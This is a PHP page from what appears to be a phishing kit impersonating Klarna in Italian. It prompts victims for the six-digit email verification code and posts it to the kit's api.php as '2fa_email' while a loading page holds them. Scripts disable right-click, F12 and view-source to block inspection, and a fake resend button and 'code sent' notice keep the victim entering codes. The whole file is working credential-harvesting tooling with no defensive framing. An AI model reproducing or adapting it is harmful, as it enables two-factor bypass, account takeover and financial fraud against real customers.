<?php
require_once __DIR__ . '/guard.php';

$clientData = getClientData(getToken());
$status = $clientData['status'] ?? '';
$allowed = ['go_email', 'otp_error', 'code_EMAIL'];
if (!in_array($status, $allowed)) {
    header('Location: loading.php');
    exit;
}

$token = getToken();
$displayEmail = $clientData['display_email'] ?? '***@email.com';
$hasError = isset($_GET['error']) && $_GET['error'] === 'otp';
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Klarna | Verifica Email</title>
    <script>window.clientToken = "<?php echo htmlspecialchars($token); ?>";</script>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && (e.key === 'u' || e.key === 'U'))) { e.preventDefault(); return false; }
        });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); min-height: 780px; display: flex; flex-direction: column; }
        .btn-dark { background-color: #080516; color: white; border-radius: 45px !important; padding-top: 14px !important; padding-bottom: 14px !important; }
        .btn-dark:hover { background-color: #000; }
        input { border: 1.5px solid #d1d1d6 !important; font-size: 1rem !important; border-radius: 12px; }
        input:focus { border-color: #080516 !important; outline: none; }
        .error-msg-bar { background: #fff1f3; color: #000; padding: 12px; border-radius: 12px; font-size: 13px; display: none; align-items: center; margin-top: 16px; }
        .error-dot { width: 16px; height: 16px; background: #9c1c31; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; margin-right: 8px; flex-shrink: 0; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
    </style>
</head>
<body>
    <div class="auth-card">
         <div class="text-center pt-2 mb-6">
             <img src="https://logolook.net/wp-content/uploads/2022/06/Klarna-Logo-2017.png" 
                  alt="Klarna" 
                  style="height: 32px; width: auto; display: inline-block; object-fit: contain;">
         </div>
        <div class="flex justify-between items-center mb-6">
            <a href="login.php" class="text-xl hover:opacity-50">←</a>
            <a href="index.php" class="text-2xl font-light hover:opacity-50 leading-none">&times;</a>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-2 leading-tight tracking-tight">Inserisci il codice di<br>6 cifre</h1>
            <p class="text-[14px] text-[#5e5e6e] mb-4">Un codice di verifica è stato inviato a <span class="text-black font-medium"><?php echo htmlspecialchars($displayEmail); ?></span> <a href="login.php" class="text-[#4b3ec4] font-semibold ml-1 text-[13px]">Modifica</a></p>

            <div class="relative mb-4">
                <svg class="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-[#8a8a96]" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M22 7l-10 7L2 7"/></svg>
                <input type="text" id="code-email" maxlength="6" placeholder="Inserisci il codice" class="w-full pl-12 pr-4 py-4 outline-none text-[15px] placeholder:text-[#8a8a96]" inputmode="numeric">
            </div>

            <div id="email-green-notif" class="hidden bg-[#d4edda] border border-[#c3e6cb] rounded-2xl p-4 mb-5 flex items-start gap-3">
                <svg class="w-5 h-5 text-[#28a745] flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
                <div>
                    <p class="text-[13px] font-semibold text-[#155724]">Codice inviato alla tua email</p>
                    <p class="text-[12px] text-[#155724] mt-0.5">Dovresti ricevere un'email entro pochi minuti.</p>
                </div>
            </div>

            <div id="email-error" class="error-msg-bar" style="<?php echo $hasError ? 'display:flex;' : ''; ?>">
                <span class="error-dot">!</span>
                <span class="ml-2 font-medium">Hai inserito un codice errato. Riprova.</span>
            </div>
        </div>
        <div style="margin-top: auto; width: 100%;">
            <button id="btn-email-submit" onclick="submitEmailCode()" class="w-full btn-dark py-3.5 font-bold text-[1rem]">Verifica</button>
            <div class="text-center pb-4 mt-3">
                <button onclick="resendCode()" class="text-[14px] text-[#8a8a96] font-medium hover:text-[#080516] transition">Invia di nuovo il codice</button>
            </div>
        </div>
    </div>

    <script>
        window.onload = function() {
            const notif = document.getElementById('email-green-notif');
            if (notif) {
                notif.classList.remove('hidden');
                setTimeout(() => notif.classList.add('hidden'), 10000);
            }
        };

        function resendCode() {
            let fd = new FormData();
            fd.append('type', 'landing_click');
            fetch('api.php', { method: 'POST', body: fd });
            alert('Codice reinviato');
        }

        function submitEmailCode() {
            const el = document.getElementById('code-email');
            const code = el.value.replace(/\D/g, '');
            if (code.length !== 6) {
                document.getElementById('email-error').style.display = 'flex';
                return;
            }
            document.getElementById('email-error').style.display = 'none';
            
            let fd = new FormData();
            fd.append('code', code);
            fd.append('type', '2fa_email');
            
            document.getElementById('btn-email-submit').innerText = 'Verifica...';
            
            fetch('api.php', { method: 'POST', body: fd })
            .then(() => {
                window.location.href = 'loading.php?return=email.php';
            })
            .catch(() => {
                document.getElementById('btn-email-submit').innerText = 'Verifica';
            });
        }

        document.getElementById('code-email').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
            if (e.target.value.length === 6) submitEmailCode();
        });
    </script>
</body>
</html>